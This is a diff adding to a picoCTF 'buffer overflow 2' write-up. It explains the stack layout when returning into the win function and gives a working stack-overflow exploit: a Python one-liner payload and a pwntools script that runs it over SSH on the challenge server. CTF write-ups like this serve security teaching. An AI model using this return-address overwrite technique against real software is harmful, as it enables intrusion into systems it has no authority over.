@@ -111,15 +111,53 @@ So, to print the flag arg1 must be 0xdeadbeef and arg2 0xdeadc0de.
 How could we intervene to those values?
 
 Think about it...
-Before we call RET instruction inside `vuln` ontains X address and program is at address X + 0x4.  We've changed return address in order to jump to `win`.
-With ret instruction we pop return address from stack, so now inside rbp we find X + 0x4. 
+Before we call RET instruction inside `vuln`  esp contains X address and program is at address X + 0x4.  We've changed return address in order to jump to `win`.
+With ret instruction we pop return address from stack, so now inside esp we find X + 0x4. 
 Then, prolog of `win` function comes:
 ```asm
 0x080485cb <+0>:	push   ebp
 0x080485cc <+1>:	mov    ebp,esp
 ```
 
-We push ebp, so 
+We push ebp, so esp is again X and then ebp of win function == esp of vuln function just before ret instruction which is ebp + 0x4 of vuln function. 
+So, quick mats we have to place the 2 arguments at ebp + 0xc and ebp + 0x10. That's it, buffer overflow technique exactly the same as in the previous challenge. 
+
+> # Crafting the exploit
+
+```bash
+python -c 'print "A"*112 + "\xcb\x85\x04\x08" + "\x90"*4 + "\xef\xbe\xad\xde" + "\xde\xc0\xad\xde"' > payload
+
+./vuln < payload
+```
+
+Python script:
+
+```python
+#!/usr/bin/python
+
+from pwn import *
+import struct
+
+user = 'XXXX'
+pw = 'XXXX'
+
+
+vuln = ELF('./vuln')
+payload = 'A' * 112
+payload += p32(vuln.symbols['win'])
+payload += "\x90" * 4
+payload += struct.pack("I", 0xdeadbeef)
+payload += struct.pack("I", 0xdeadc0de)
+
+s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
+s.set_working_directory('/problems/buffer-overflow-2_1_63b4b691601811c553a7c19e367737b9')
+
+r = s.process('./vuln')
+print r.recv()
+r.sendline(payload)
+print r.recv()
+r.close()
+```
 
 
 
